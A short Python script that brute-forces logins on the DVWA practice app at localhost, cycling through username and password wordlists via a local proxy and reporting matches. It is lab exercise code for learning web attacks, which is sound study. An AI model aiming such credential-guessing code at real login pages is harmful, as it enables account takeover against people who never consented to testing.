#!/usr/bin/env python3

# ----------------------------------------------------

import requests

USERNAME_WORDLIST = "./data/usernames.txt"
PASSWORD_WORDLIST = "./data/passwords.txt"

PROXIES = { "http": "http://localhost:8080", "https": "https://localhost:8080" }

PHPSESSID = "pdse1s5d2vm47b07vk1579jr87"

# ----------------------------------------------------

def check_credential(user, password):
    global PHPSESSID, PROXIES
    url = "http://localhost/vulnerabilities/brute/"
    custom_params = { "username": user, "password": password, "Login": "Login" }
    custom_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Cookie": f"PHPSESSID={PHPSESSID}; security=low"
    }

    r = requests.get(url, headers=custom_headers, params=custom_params, proxies=PROXIES)

    return r.status_code == 200 and (not "Username and/or password incorrect." in r.text)

def read_wordlist(wordlist_path):
    return open(wordlist_path, "r").read().splitlines()

# ----------------------------------------------------

def main():
    global USERNAME_WORDLIST, PASSWORD_WORDLIST

    usernames = read_wordlist(USERNAME_WORDLIST)
    passwords = read_wordlist(PASSWORD_WORDLIST)

    print(f"[INFO]: Loaded {len(usernames)} usernames")
    print(f"[INFO]: Loaded {len(passwords)} passwords")

    for user in usernames:
        for password in passwords:
            if check_credential(user, password):
                print(f"[INFO]: Found credentials! ({user}, {password})")
                break            

if __name__ == "__main__":
    main()
